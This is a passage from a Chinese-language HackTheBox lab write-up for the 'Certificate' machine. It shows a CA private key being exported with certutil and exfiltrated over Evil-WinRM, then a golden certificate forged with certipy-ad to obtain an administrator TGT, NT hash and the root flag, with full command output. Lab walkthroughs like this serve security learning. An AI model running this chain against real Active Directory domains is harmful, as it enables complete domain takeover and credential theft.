75b2f4bbf31f108945147b466131bdca\nIssuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb\n NotBefore: 11/3/2024 3:55 PM\n NotAfter: 11/3/2034 4:05 PM\nSubject: CN=Certificate-LTD-CA, DC=certificate, DC=htb\nCertificate Template Name (Certificate Type): CA\nCA Version: V0.0\nSignature matches Public Key\nRoot Certificate: Subject matches Issuer\nTemplate: CA, Root Certification Authority\nCert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8\n  Key Container = Certificate-LTD-CA\n  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958\n  Provider = Microsoft Software Key Storage Provider\nSignature <span class=\"hljs-built_in\">test</span> passed\nEnter new password <span class=\"hljs-keyword\">for</span> output file C:\\Users\\Public\\ca.pfx:\nEnter new password:\nConfirm new password:\nCertUtil: -exportPFX <span class=\"hljs-built_in\">command</span> completed successfully.\n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> download ../../Public/ca.pfx\n                                        \nInfo: Downloading C:\\Users\\Ryan.K\\Documents\\../../Public/ca.pfx to ca.pfx\n                                        \nInfo: Download successful!\n</code></pre>\n<ul>\n<li>CertUtil 会打开“my”证书存储（Personal/My），找到<strong>主题名称 (Subject Name / Issued To)</strong> 或**友好名称 (Friendly Name)**为“<code>Certificate-LTD-CA</code>”的那张证书</li>\n<li>然后把这张证书及其私钥（以及可能的证书链）打包成一个 PFX 文件</li>\n<li>最终会在 <code>C:\\Users\\Public\\ca.pfx</code> 位置生成一个二进制的 PFX 文件</li>\n</ul>\n<h3>Golden certificate</h3>\n<p>拿到 <code>ca.pfx</code> 的证书公私钥后可以进行黄金证书（Golden certificate）攻击</p>\n<blockquote>\n<p><a href=\"https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate\">https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate</a></p>\n</blockquote>\n<p>伪造<code>administrator</code> 的证书</p>\n<pre><code class=\"hljs language-bash\">➜  Certificate certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject <span class=\"hljs-string\">'CN=Administrator,CN=Users,DC=certificate,DC=htb'</span> -out administrator_forge.pfx\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Saving forged certificate and private key to <span class=\"hljs-string\">'administrator_forge.pfx'</span>\n[*] Wrote forged certificate and private key to <span class=\"hljs-string\">'administrator_forge.pfx'</span>\n</code></pre>\n<p>使用证书获取<code>TGT</code></p>\n<pre><code class=\"hljs language-bash\">➜  Certificate certipy-ad auth -pfx administrator_forge.pfx -dc-ip 10.10.11.71 -domain certificate.htb -username administrator\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: <span class=\"hljs-string\">'administrator@certificate.htb'</span>\n[*] Using principal: <span class=\"hljs-string\">'administrator@certificate.htb'</span>\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to <span class=\"hljs-string\">'administrator.ccache'</span>\n[*] Wrote credential cache to <span class=\"hljs-string\">'administrator.ccache'</span>\n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator'</span>\n[*] Got <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator@certificate.htb'</span>: aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6\n</code></pre>\n<p><code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\n7d69ba1c8bb2ee23ff27f0e1610caa3b\n</code></pre>\n<h2>总结</h2>\n<p>任重道远，不会的还是多…比如利用<code>certutil</code>来导出证书这一点，以及文件上传的<code>ZipSlip</code> ，总的也是学习到了新东西</p>","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","updated":"2025-06-02","tags":["HackTheBox","Windows","ADCS","GoldenCertificate","seManageVolumePrivilegem","ZipSlip","encrypt"],"categories":"靶机","comments":true,"isEncrypted":true},"recentPosts":[{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","isEncrypted":true,"year":"2025","month":"06","day":"02"},{"id":"HackTheBoxMachine - Strutted","title":"HackTheBox - Machine - Strutted","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"06","day":"02"},{"id":"VulnyxBuild","title":"Vulnyx - Build","date":"2025-06-01","isEncrypted":false,"year":"2025","month":"06","day":"01"}]},"__N_SSG":true}